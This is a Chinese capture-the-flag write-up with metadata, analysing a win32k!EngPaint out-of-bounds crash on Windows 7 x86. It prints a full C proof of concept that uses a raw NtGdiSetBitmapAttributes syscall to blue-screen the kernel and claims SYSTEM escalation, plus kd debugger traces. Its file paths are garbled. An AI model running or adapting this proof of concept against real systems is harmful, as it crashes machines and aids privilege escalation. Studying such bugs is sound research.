---
title: SSCTF-pwn450 win kernel 漏洞分析 (三)
contest: SSCTF
year: 2014
difficulty: hard
vuln_type: misc_unknown
tags:
- windows-kernel
- gdi-bug
- bitmap-surfobj
- kmdf-driver
- win32k-bsod
attack_chain:
- demo_CreateBitmapIndirect 创建 8x8 灰度 HBITMAP
- NtGdiSetBitmapAttributes 系统调用号 0x1110
- argv1 = 0x8f9 触发 win32k!EngPaint BSOD
- CreateRectRgnIndirect(rect.left=0x368c, top=0x400000) 创建巨型 region
- CreateCompatibleDC(0) 拿 HDC
- SelectObject 选入 HDC 触发 SURFOBJ 越界
- FillRgn 调用 EngPaint 崩溃 win32k!bGetRealizedBrush
- 手工双机调试 kd 下断 EngPaint + pvGetEngRbrush
- fe723018 即 SURFOBJ 结构体
- fe723008+1c 偏移是 SURFOBJ c 字段
- test [eax+24h],1 触发 access violation
- 通过构造特殊 SURFOBJ 走 if 分支 bIsCompatible 失败
key_payload: NtGdiSetBitmapAttributes(hBitmap1, 0x8f9)
one_liner: Windows 7 SP1 x86 下 win32k!EngPaint 越界 BSoD 漏洞剖析 (CloverSec bee13oy 作品)。
lesson: 早期 win32k 图形子系统有大量未公开 IOCTL/结构偏移；现代 Win10/Win11 已修复此类 ENG 路径。
quality: high
full_path: SSCTF-pwn450_win_kernel_漏洞分析_（三）.full.md
meta_path: SSCTF-pwn450_win_kernel_漏洞分析_（三）.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: SSCTF-pwn450 win kernel 漏洞分析 (三)。Windows 7 SP1 x86 下 win32k!EngPaint 越界 BSoD 漏洞剖析 (CloverSec bee13oy 作品)。。关键路径：demo_CreateBitmapIndirect 创建 8x8 灰度 HBITMAP → NtGdiSetBitmapAttributes 系统调用号 0x1110 → ...
category: misc
subcategory: misc_other
tools_used:
- x86/x64
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/154359.html
reasoning_chain:
- 题目 Windows 7 SP1 x86 win32k BSoD → 触发点：demo_CreateBitmapIndirect + NtGdiSetBitmapAttributes
- demo 创建 8x8 灰度 HBITMAP + argv1=0x8f9 触发 win32k!EngPaint BSOD
- CreateRectRgnIndirect(rect.left=0x368c, top=0x400000) 创建巨型 region
- CreateCompatibleDC(0) 拿 HDC → SelectObject 选入 → 触发 SURFOBJ 越界
- FillRgn 调用 EngPaint 崩溃 win32k!bGetRealizedBrush → access violation
- 手工双机调试 kd 下断 EngPaint + pvGetEngRbrush → fe723018 即 SURFOBJ 结构体
- fe723008+1c 偏移是 SURFOBJ c 字段 → test [eax+24h],1 触发越界
- 构造特殊 SURFOBJ 走 if 分支 bIsCompatible 失败 → EoP on Windows 7
failed_attempts:
- 试图用普通 GDI API → 失败：必须 NtGdiSetBitmapAttributes 触发未公开路径
- 试图在 Win10 复现 → 失败：现代 Win10/Win11 已修复 ENG 路径
- 试图静态分析 → 失败：必须双机 kd 动态调试才能看 SURFOBJ 布局
key_observations:
- 早期 win32k 图形子系统有大量未公开 IOCTL/结构偏移
- 现代 Win10/Win11 已修复此类 ENG 路径
- SURFOBJ c 字段 test [eax+24h],1 是越界 access violation 触发点
- 双机 kd 调试是 Windows kernel 漏洞分析必备工具
prerequisites:
- Windows 7 x86 内核 + win32k.sys 图形子系统
- GDI API + HBITMAP/HDC 句柄管理
- Windbg kd 双机内核调试
- SURFOBJ 结构 + EngPaint 调用路径
---
# SSCTF-pwn450 win kernel 漏洞分析 （三）

> 原文: https://www.ctfiot.com/154359.html
> ID: 154359


```
"C:
Program FilesDebugging Tools for Windows (x86)ntsd.exe" -ddefer -y C:
UsersrootDesktopSSCTFpwn450.pdb C:
UsersrootDesktopSSCTFpwn450.exe
/**

* Author: bee13oy of CloverSec Labs

* BSoD on Windows 7 SP1 x86 / Windows 10 x86

* EoP to SYSTEM on Windows 7 SP1 x86

**/

    #include <Windows.h>

    #pragma comment(lib, "gdi32.lib")

    #pragma comment(lib, "user32.lib")

unsigned int demo_CreateBitmapIndirect(void) {

 static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };

 static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,

 0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };

 bitmap.bmBits = bits;

 SetLastError(NO_ERROR);

 HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);

 return (unsigned int)hBitmap;

}

    #define eSyscall_NtGdiSetBitmapAttributes 0x1110

W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(

 HBITMAP argv0,

 DWORD argv1

 )

{

 __asm

 {

 push argv1;

 push argv0;

 push 0x00;

 mov eax, eSyscall_NtGdiSetBitmapAttributes;

 mov edx, addr_kifastsystemcall;

 call edx;

 add esp, 0x0c;

 }

}

void Trigger_BSoDPoc() {

 HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();

 HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);

 RECT rect = { 0 };

 rect.left = 0x368c;

 rect.top = 0x400000;

 HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);

 HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);

 SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

 HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

 FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);

}

int _tmain(int argc, _TCHAR* argv[])

{

 Trigger_BSoDPoc();

 return 0;

}
kd> g

Breakpoint 0 hit

win32k!EngPaint:

9aacb697 8bff mov edi,edi

kd> kb

 # ChildEBP RetAddr Args to Child

00 90b37a54 9aacbb9d fe723018 90b37a7c 90b37af8 win32k!EngPaint

01 90b37c20 83e411ea 00000000 ffbff968 0510021b win32k!NtGdiFillRgn+0x339

02 90b37c20 776370b4 00000000 ffbff968 0510021b nt!KiFastCallEntry+0x12a

BOOL __stdcall EngPaint(SURFOBJ *pso, CLIPOBJ *pco, BRUSHOBJ *pbo, POINTL *pptlBrushOrg, MIX mix)

根据栈帧和函数调用可以发现 fe723018 位置就是 SURFOBJ 对象

kd> g

Breakpoint 1 hit

win32k!bGetRealizedBrush:

9a9d0528 8bff mov edi,edi

kd> kb

 # ChildEBP RetAddr Args to Child

00 90b379a0 9a9d34af fd4d4d98 90b37af8 9a9cd5a0 win32k!bGetRealizedBrush

01 90b379b8 9aa49b5e 90b37af8 00000001 90b37a7c win32k!pvGetEngRbrush+0x1f

kd> dd 90b37af8

90b37af8 ffffffff 00000000 00000000 00edfc13

90b37b08 00edfc13 00000000 00000006 00000004

90b37b18 00000000 00ffffff fe4dd0a4 00000000

90b37b28 00000000 fe723008 ffbff968 ffbffe68

90b37b38 ffbbd540 00000006 fd4d4d98 00000014

90b37b48 000000af 00000001 00000000 00000000

90b37b58 90b37b70 9aa523eb 00000400 0000021b

90b37b68 90b37c10 c03bbf00 00000000 00000000

90b37af8 + 34h = fe723008

kd> dd fe723008

fe723008 04850220 00000001 80000000 876b1a70

fe723018 00000000 04850220 00000000 00000000

fe723028 00000008 00000008 00000020 fe72315c

fe723038 fe72315c 00000004 000016c5 00000001

fe723048 02010000 00000000 04000000 00000000

fe723058 ffbff968 00000000 00000000 00000000

fe723068 00000000 00000000 00000001 00000000

fe723078 00000000 00000000 00000000 00000000

fe723008 + 1ch = 0

fe723018 位置就是 SURFOBJ 结构体

fe723008 + 1ch 实际上就是 SURFOBJ + c

kd> g

Access violation - code c0000005 (!!! second chance !!!)

win32k!bGetRealizedBrush+0x38:

9a9d0560 f6402401 test byte ptr [eax+24h],1

kd> kb

 # ChildEBP RetAddr Args to Child

00 90b379a0 9a9d34af 00000000 00000000 9a9cd5a0 win32k!bGetRealizedBrush+0x38

01 90b379b8 9aa49b5e 90b37af8 00000001 90b37a7c win32k!pvGetEngRbrush+0x1f

02 90b37a1c 9aacb6e8 fe723018 00000000 00000000 win32k!EngBitBlt+0x337

03 90b37a54 9aacbb9d fe723018 90b37a7c 90b37af8 win32k!EngPaint+0x51

04 90b37c20 83e411ea 00000000 ffbff968 0510021b win32k!NtGdiFillRgn+0x339

838aba40 8b99f8010000 mov ebx,dword ptr [ecx+1F8h]

838abb98 e8fafaffff call win32k!EngPaint (838ab697)
if ( v4 != (HDEV)SURFACE::
pdibDefault )

 {

 INC_SHARE_REF_CNT(v4);

 ++*((_DWORD *)v4 + 0x1A);

 if ( !SURFACE::
bStockSurface((SURFACE *)v4) )

 {

 v4[25] = *(_DWORD *)(HDEV)v15[0];

 v4[7] = *(_DWORD *)((char *)v15[0] + 0x24); // 对SURFOBJ + C 赋值

 }

 }
v19 = v6;

 if ( *((_DWORD *)v15[0] + 5) != 1

 || *((_DWORD *)v4 + 26) && !SURFACE::
bStockSurface((SURFACE *)v4) && *((_DWORD *)v4 + 25) != *(_DWORD *)v5

 || !bIsCompatible((struct PALETTE **)&a1, *((struct PALETTE **)v4 + 20), (struct SURFACE *)v4, v19, 1) ) // bIsCompatible检查不通过

 {

 goto LABEL_62;

 }
```
